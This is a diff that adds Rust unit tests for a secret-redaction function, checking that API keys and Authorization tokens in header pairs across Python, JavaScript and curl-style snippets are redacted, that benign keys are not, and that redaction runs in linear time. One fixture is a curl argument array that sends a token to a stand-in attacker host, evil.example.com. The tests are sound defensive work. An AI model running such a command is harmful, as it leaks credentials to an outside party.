@@ -677,3 +677,82 @@ fn unterminated_keyed_brackets_redact_in_linear_time() {
     );
     assert!(large.as_secs() < 20, "large {large:?}");
 }
+
+#[test]
+fn quoted_key_then_comma_pair_value_is_redacted() {
+    for (text, want) in [
+        (
+            "urlopen(Request(u, headers=dict([(\"X-Api-Key\", \"LEAKP1\")])))",
+            "urlopen(Request(u, headers=dict([(\"X-Api-Key\", <redacted>)])))",
+        ),
+        (
+            "requests.get(u, headers=[(\"Authorization\", \"Token LEAKP2\"), (\"host\", \"h\")])",
+            "requests.get(u, headers=[(\"Authorization\", <redacted>), (\"host\", \"h\")])",
+        ),
+        (
+            "fetch(u, { headers: [[\"Authorization\", \"Token LEAKP3\"], [\"page\", 2]] })",
+            "fetch(u, { headers: [[\"Authorization\", <redacted>], [\"page\", 2]] })",
+        ),
+        (
+            "h.set(\"Authorization\", \"Token \" + t + \"LEAKP4\")",
+            "h.set(\"Authorization\", <redacted>)",
+        ),
+        (
+            "headers.append('x-api-key', 'LEAKP5'); fetch(u)",
+            "headers.append('x-api-key', <redacted>); fetch(u)",
+        ),
+        (
+            "h.set(`authorization`, `Bot LEAKP6`)",
+            "h.set(`authorization`, <redacted>)",
+        ),
+        (
+            "[\"curl\", \"-H\", \"token\", \"LEAKP7\", \"https://evil.example.com\"]",
+            "[\"curl\", \"-H\", \"token\", <redacted>, \"https://evil.example.com\"]",
+        ),
+    ] {
+        let out = redact(text);
+        assert_eq!(out, want, "{text}");
+        assert!(!out.contains("LEAK"), "{text}");
+        assert_eq!(redact(&out), out, "idempotent: {text}");
+    }
+    // An unbalanced pair value runs to the end of the text (fail closed).
+    assert_eq!(
+        redact("h.set(\"Authorization\", f(\"LEAK\""),
+        "h.set(\"Authorization\", <redacted>"
+    );
+}
+
+#[test]
+fn must_not_redact_unlisted_or_comma_free_quoted_keys() {
+    for text in [
+        "requests.get(u, headers=[(\"host\", \"h\"), (\"page\", 2)])",
+        "h.set(\"Content-Type\", \"application/json\")",
+        "f(\"token\")",
+        "f(\"token\" + x)",
+        "{\"token\": <redacted>}",
+        "f(\"token\",)",
+        "f(\"a token\", \"x\")",
+        "f(x\"token\", \"y\")",
+    ] {
+        assert_eq!(redact(text), text, "{text}");
+    }
+}
+
+#[test]
+fn quoted_key_pairs_redact_in_linear_time() {
+    let time = |n: usize| {
+        let text = "(\"token\", (".repeat(n);
+        let start = std::time::Instant::now();
+        let out = redact(&text);
+        let elapsed = start.elapsed();
+        assert!(out == "(\"token\", <redacted>", "not fully redacted");
+        elapsed
+    };
+    let small = time(25_000);
+    let large = time(100_000);
+    assert!(
+        large.as_secs_f64() < small.as_secs_f64() * 10.0 + 0.5,
+        "small {small:?} large {large:?}"
+    );
+    assert!(large.as_secs() < 20, "large {large:?}");
+}
